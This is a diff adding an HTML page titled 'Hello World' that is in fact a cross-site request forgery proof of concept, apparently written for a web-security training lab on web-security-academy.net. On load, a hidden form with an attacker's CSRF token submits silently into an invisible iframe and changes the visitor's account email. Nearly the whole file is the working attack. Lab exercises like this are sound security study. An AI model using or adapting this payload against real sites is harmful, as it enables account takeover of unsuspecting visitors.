@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello World</title>
+</head>
+
+<body>
+    <h1>Hello World</h1>
+    <iframe style="display: none;" name="csrf-iframe"></iframe>
+    <form action="https://0af2003f03bcd89b8073b37e00ea00b5.web-security-academy.net/my-account/change-email"
+        method="POST" id="csrf-form" target="csrf-iframe">
+        <input type="hidden" name="email" value="test12345@test.ca">
+        <input type="hidden" name="csrf" value="Bz2fA0JHretavKSX29CemEPXa6DhzvlE">
+        <!-- Attacker csrf token -->
+    </form>
+
+    <script>
+        document.getElementById('csrf-form').submit()
+    </script>
+</body>
+
+</html>
